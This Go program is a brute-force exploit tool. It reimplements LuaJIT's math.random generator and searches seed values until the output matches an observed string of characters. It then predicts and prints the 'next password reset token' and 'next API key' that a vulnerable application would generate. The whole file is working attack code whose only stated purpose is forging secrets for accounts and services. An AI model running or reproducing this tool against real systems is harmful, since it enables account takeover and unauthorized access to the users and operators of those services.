package main

import (
	"flag"
	"fmt"
	"log"
	"math"
	"os"
	"sync"
	"sync/atomic"
	"time"
	"unsafe"
)

type LuaJitRandState [4]uint64

var (
	task      []int
	completed uint32
	hasResult uint32
	result    uint32
	total     uint32
	position  uint32

	mu       uint64 = math.MaxUint64
	minSeed         = flag.Uint64("min", 0, "Min seed value")
	maxSeed         = flag.Uint64("max", math.MaxUint32, "Max seed value")
	fSeq            = flag.String("seq", "", "Seq of chars")
	fDepth   uint64
	fReverse bool
)

func (lj *LuaJitRandState) mathRandomStep() uint64 {
	var z, r uint64 = 0, 0
	z = lj[0]
	var a = int64(-1)
	mxu64 := *(*uint64)(unsafe.Pointer(&a))
	z = (((z << 31) ^ z) >> (63 - 18)) ^ (z & (mxu64 << (64 - 63)) << 18)
	r ^= z
	lj[0] = z

	z = lj[1]
	z = (((z << 19) ^ z) >> (58 - 28)) ^ ((z & (mxu64 << (64 - 58))) << 28)
	r ^= z
	lj[1] = z

	z = lj[2]
	z = (((z << 24) ^ z) >> (55 - 7)) ^ ((z & (mxu64 << (64 - 55))) << 7)
	r ^= z
	lj[2] = z

	z = lj[3]
	z = (((z << 21) ^ z) >> (47 - 8)) ^ ((z & (mxu64 << (64 - 47))) << 8)
	r ^= z
	lj[3] = z

	return (r&(0x000fffff<<32) + 0xffffffff) | (0x3ff00000 << 32) + 0x00000000
}

func (lj *LuaJitRandState) randomInit(seed float64) {
	var r uint32 = 0x11090601
	var i int
	for i = 0; i < 4; i++ {
		var m = float64(math.Float64frombits(uint64(1 << (r & 255))))
		r >>= 8
		var d = seed*3.14159265358979323846 + 2.7182818284590452354
		seed = d
		if d < m {
			d += m
		}

		u64 := *(*uint64)(unsafe.Pointer(&d))
		lj[i] = u64
	}

	for i := 0; i < 10; i++ {
		lj.mathRandomStep()
	}

}

func (lj *LuaJitRandState) Seed(seed uint64) {
	lj.randomInit(float64(seed))
}

func (lj *LuaJitRandState) smartRand(n int, args ...int) int {
	switch n {
	case 0:
		break
	case 2:
		var l = args[0]
		var u = args[1]
		ru64 := lj.mathRandomStep()
		d64 := *(*float64)(unsafe.Pointer(&ru64)) - 1.0
		return int(math.Floor(d64*(float64(u)-float64(l)+1.0)) + float64(l))
	default:
		log.Println("Not used")
		return 0
	}

	return 0
}

func (lj *LuaJitRandState) Random() int {
	var ret int
	r := lj.smartRand(2, 1, 3)
	switch r {
	case 1:
		ret = lj.smartRand(2, 65, 90)
		break
	case 2:
		ret = lj.smartRand(2, 97, 122)
		break
	case 3:
		ret = lj.smartRand(2, 48, 57)
		break
	}
	return ret
}

type Chunk struct {
	Min uint64
	Max uint64
}

type Worker struct {
	chunk *Chunk
	depth int
	left  uint32
}

func (w *Worker) Left() uint32 {
	return w.left
}

func (w *Worker) brute(seed uint64) {
	var l LuaJitRandState
	l.Seed(seed)
	found := 0
	for j := 0; j <= w.depth; j++ {
		rnd := l.Random()
		observed := task[found]
		if rnd == observed {
			found++
			if found == len(task) {
				atomic.AddUint32(&hasResult, 1)
				atomic.AddUint32(&completed, th)
				atomic.AddUint32(&result, uint32(seed))
				atomic.AddUint32(&position, uint32(j+1-found))
				break
			}
		} else if found > 0 {
			found = 0
		}
	}
	w.left++
}

func (w *Worker) Run(wg *sync.WaitGroup) {

	if fReverse {
		for i := w.chunk.Max; i >= w.chunk.Min; i-- {
			isCompleted := atomic.LoadUint32(&completed)
			if isCompleted >= th {
				wg.Done()
				return
			}
			w.brute(uint64(i))
		}
	} else {
		for i := w.chunk.Min; i <= w.chunk.Max; i++ {
			isCompleted := atomic.LoadUint32(&completed)
			if isCompleted >= th {
				wg.Done()
				return
			}
			w.brute(uint64(i))
		}
	}
	atomic.AddUint32(&completed, 1)
	wg.Done()
	return
}

var th = uint32(4)

func expander(chunks []*Chunk, index uint32) {
	for idx, chunk := range chunks {
		if uint32(idx) == index {
			chunk.Max++
		}
		if uint32(idx) > index {
			if uint32(idx) > 0 && uint32(idx) < th {
				chunk.Min++
				chunk.Max++
			}
		}
	}
}

var startedTime = time.Now()

func progress(workers *[]*Worker, wg *sync.WaitGroup) {
	var iter int32
	for {
		var sum = uint32(0)
		if iter%2 == 0 {
			for _, w := range *workers {
				sum += w.Left()
			}

			duration := time.Since(startedTime)
			psec := float64(sum) / duration.Seconds()

			percent := float64(sum) / float64(total) * 100.0
			leftStr := `=>`
			if psec > 0 {
				timeLeft := (total - sum) / uint32(psec)
				secondsLeft := timeLeft % 60
				minutesLeft := (timeLeft / 60) % 60
				hoursLeft := (timeLeft / 3600) % 24
				daysLeft := (timeLeft / 86400) % 365

				if daysLeft > 0 {
					leftStr += fmt.Sprintf(" %d days", daysLeft)
				}
				if hoursLeft > 0 {
					leftStr += fmt.Sprintf(" %d hours", hoursLeft)
				}
				if minutesLeft > 0 {
					leftStr += fmt.Sprintf(" %d min", minutesLeft)
				}

				leftStr += fmt.Sprintf(" %d sec", secondsLeft)

			}

			fmt.Printf("\r[*] Progress: %.2f%% [%d of %d] (%d/sec) %s", percent, sum, total, uint32(psec), leftStr)

			if completed == th {
				wg.Done()
				return
			}
		}
		iter++
		time.Sleep(time.Second)
	}
}

func init() {
	flag.BoolVar(&fReverse, "reverse", false, "Desc order")
	flag.Uint64Var(&fDepth, "d", 0, "Depth")
	flag.Parse()

	if fDepth < uint64(len(*fSeq)) {
		fDepth = uint64(len(*fSeq))
	}
	total = uint32(*maxSeed - *minSeed)
	if len(*fSeq) < 1 {
		flag.Usage()
		os.Exit(0)
	}
}

func main() {
	for _, char := range *fSeq {
		task = append(task, int(char))
	}

	var chunks []*Chunk
	var chunkSize = uint64(total / th)
	var rem = total % th

	for i := uint32(0); i < th; i++ {
		if i == 0 {
			chunks = append(chunks, &Chunk{*minSeed, *minSeed + chunkSize})
		} else {
			chunks = append(chunks, &Chunk{*minSeed + 1, *minSeed + chunkSize})
		}
		*minSeed = *minSeed + chunkSize
	}

	chIndex := uint32(0)
	for rem > 0 {
		rem--
		expander(chunks, chIndex)
		chIndex++
		if chIndex == th {
			chIndex = 0
		}
	}

	var workers []*Worker
	for _, c := range chunks {
		workers = append(workers, &Worker{
			chunk: c,
			depth: int(fDepth),
		})
	}
	fmt.Printf("[*] Order: desc\n")
	fmt.Printf("[*] Depth: %d\n", fDepth)

	var wg sync.WaitGroup
	for _, worker := range workers {
		wg.Add(1)
		go worker.Run(&wg)
	}

	wg.Add(1)
	go progress(&workers, &wg)
	wg.Wait()

	_hasResult := atomic.LoadUint32(&hasResult)
	if _hasResult > 0 {
		_result := atomic.LoadUint32(&result)
		_position := atomic.LoadUint32(&position)
		fmt.Printf("\n[*] Found seed: %d, position: %d\n", _result, _position)

		var l LuaJitRandState
		l.Seed(uint64(_result))
		for i := 0; i < len(*fSeq); i++ {
			l.Random()
		}

		if _position > 0 {
			for i := 0; i < int(_position); i++ {
				l.Random()
			}
		}

		var newSeq = ""
		for i := 0; i < 40; i++ {
			newSeq += string(l.Random())
		}

		fmt.Printf("\n[*] Next password reset token: %s\n", newSeq[:30])
		fmt.Printf("\n[*] Next API key: %s\n", newSeq)

	} else {
		fmt.Printf("\n[*] Result not found :(\n")
	}
}
